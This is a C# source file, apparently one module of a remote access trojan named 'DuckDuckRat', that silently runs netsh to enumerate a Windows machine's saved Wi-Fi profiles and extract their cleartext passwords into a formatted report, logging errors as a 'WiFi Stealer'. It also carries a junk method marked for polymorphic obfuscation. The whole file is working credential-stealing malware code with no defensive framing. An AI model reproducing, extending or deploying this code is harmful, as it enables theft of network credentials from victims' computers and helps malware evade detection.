using System;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;

namespace DuckDuckRat.Modules
{
    public static class WiFiManager
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_2c643f9b() {
            int val = 99268;
            if (val > 50000) Console.WriteLine("Hash:" + 99268);
        }

        public static string GetSavedNetworks()
        {
            try
            {
                var sb = new StringBuilder();
                sb.AppendLine("📡 *SAVED WI-FI NETWORKS*");
                sb.AppendLine("```");

                string profilesStr = ExecuteNetshContent("wlan show profile");
                if (string.IsNullOrEmpty(profilesStr)) return "❌ No Wi-Fi profiles found.";

                // Parse profile names
                var matches = Regex.Matches(profilesStr, @"(?:Profile\s*:\s*)(.+)");
                int count = 0;

                foreach (Match m in matches)
                {
                    if (m.Groups.Count > 1)
                    {
                        string profileName = m.Groups[1].Value.Trim();
                        string profileInfo = ExecuteNetshContent($"wlan show profile name=\"{profileName}\" key=clear");
                        
                        // Parse password
                        string password = "NONE (Open/Enterprise)";
                        var keyMatch = Regex.Match(profileInfo, @"(?:Key Content\s*:\s*)(.+)");
                        if (keyMatch.Success && keyMatch.Groups.Count > 1)
                        {
                            password = keyMatch.Groups[1].Value.Trim();
                        }

                        // Format output safely (limit name len)
                        string safeName = profileName.Length > 20 ? profileName.Substring(0, 17) + "..." : profileName;
                        sb.AppendLine(string.Format("{0,-20} | {1}", safeName, password));
                        count++;
                    }
                }

                sb.AppendLine("```");
                sb.AppendLine($"Total: {count} networks.");
                
                string result = sb.ToString();
                return result.Length > 4000 ? result.Substring(0, 4000) + "\n...[TRUNCATED]```" : result;
            }
            catch (Exception ex)
            {
                Logger.Error("WiFi Stealer failed", ex);
                return $"❌ WiFi Error: {ex.Message}";
            }
        }

        private static string ExecuteNetshContent(string args)
        {
            try
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = args,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true,
                        StandardOutputEncoding = Encoding.UTF8
                    }
                };
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();
                return output;
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}


